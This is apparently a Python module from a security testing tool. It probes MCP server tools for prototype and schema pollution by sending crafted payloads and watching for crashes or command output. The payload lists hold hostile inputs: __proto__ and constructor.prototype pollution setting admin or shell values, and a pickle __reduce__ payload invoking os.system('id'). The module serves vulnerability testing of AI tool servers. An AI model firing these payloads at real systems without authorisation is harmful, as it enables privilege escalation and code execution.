"""Schema/prototype pollution attacks via MCP tools"""
import json
import logging


class SchemaPollutionTest:
    """Test for prototype/schema pollution vulnerabilities"""

    def __init__(self, pentester):
        self.pentester = pentester

    # JavaScript prototype pollution (DoS-focused for reliable detection)
    PROTO_PAYLOADS = [
        {"__proto__": {"toString": "polluted"}},  # Triggers TypeError on string coercion
        {"__proto__": {"valueOf": "polluted"}},   # Triggers TypeError on value coercion
        {"constructor": {"prototype": {"isAdmin": True}}},
        {"__proto__": {"shell": "/bin/sh", "env": {"PATH": "/tmp"}}},
    ]

    # Python class pollution (Note: __reduce__ only works with pickle/yaml, not JSON)
    PYTHON_PAYLOADS = [
        {"__class__": {"__init__": {"__globals__": {"admin": True}}}},
        {"__reduce__": ["os.system", ["id"]]},  # Pickle/YAML only
        {"__dict__": {"_admin": True}},
        {"__builtins__": {"__import__": "os"}},
    ]

    # Generic injection into nested structures
    NESTED_PAYLOADS = [
        {"a": {"b": {"c": {"__proto__": {"x": 1}}}}},
        {"config": {"__proto__": {"debug": True}}},
        {"settings": {"constructor": {"prototype": {"shell": True}}}},
    ]

    def run(self, tool):
        """Test for schema pollution vulnerabilities"""
        self.pentester.health_check()
        findings = []
        schema = tool.get('inputSchema', {})

        # Find object-type arguments
        for arg, spec in schema.get('properties', {}).items():
            if spec.get('type') in ['object', None]:  # None = any type
                findings.extend(self._test_pollution(tool, arg))

        # Also test with entire arguments as pollution payload
        findings.extend(self._test_root_pollution(tool))

        return findings

    def _test_pollution(self, tool, arg):
        findings = []
        all_payloads = self.PROTO_PAYLOADS + self.PYTHON_PAYLOADS + self.NESTED_PAYLOADS

        for payload in all_payloads:
            try:
                params = {"name": tool['name'], "arguments": {arg: payload}}
                resp, _ = self.pentester.send("tools/call", params)

                # Check for pollution indicators
                content = str(resp)
                if self._detect_pollution(content, payload):
                    findings.append({
                        'type': 'SCHEMA_POLLUTION',
                        'tool': tool['name'],
                        'arg': arg,
                        'payload': json.dumps(payload),
                        'severity': 'HIGH',
                        'note': 'Potential prototype/schema pollution detected'
                    })
            except (RuntimeError, IOError, OSError, KeyError, ValueError,
                    TypeError, AttributeError, TimeoutError) as e:
                logging.debug("Schema pollution test error for %s.%s: %s",
                              tool['name'], arg, e)

        return findings

    def _test_root_pollution(self, tool):
        """Test pollution at root arguments level"""
        findings = []
        all_payloads = self.PROTO_PAYLOADS + self.PYTHON_PAYLOADS

        for payload in all_payloads:
            try:
                params = {"name": tool['name'], "arguments": payload}
                resp, _ = self.pentester.send("tools/call", params)

                content = str(resp)
                if self._detect_pollution(content, payload):
                    findings.append({
                        'type': 'ROOT_POLLUTION',
                        'tool': tool['name'],
                        'payload': json.dumps(payload),
                        'severity': 'CRITICAL',
                        'note': 'Root-level pollution successful'
                    })
            except (RuntimeError, IOError, OSError, KeyError, ValueError,
                    TypeError, AttributeError, TimeoutError) as e:
                logging.debug("Root pollution test error for %s: %s",
                              tool['name'], e)

        return findings

    def _detect_pollution(self, content, payload):
        """Detect pollution via behavioral indicators, not reflection"""
        # 1. Check if semantic detector found RCE/file read
        if self.pentester.detector.findings:
            return True

        # 2. Check for RCE command output (uid= from 'id' command)
        if "uid=" in content and "gid=" in content:
            return True

        # 3. Check for DoS/crash indicators (toString/valueOf pollution)
        crash_indicators = [
            "Maximum call stack size exceeded",
            "Cannot convert object to primitive value",
            "TypeError: Cannot read property",
            "TypeError: this.toString is not a function",
            "Recursive process.env",
            "RangeError: Maximum call stack",
        ]
        if any(indicator in content for indicator in crash_indicators):
            return True

        # 4. REMOVED: Reflection checks (high false positive rate)
        # Do NOT flag just because the server echoes back invalid input

        return False
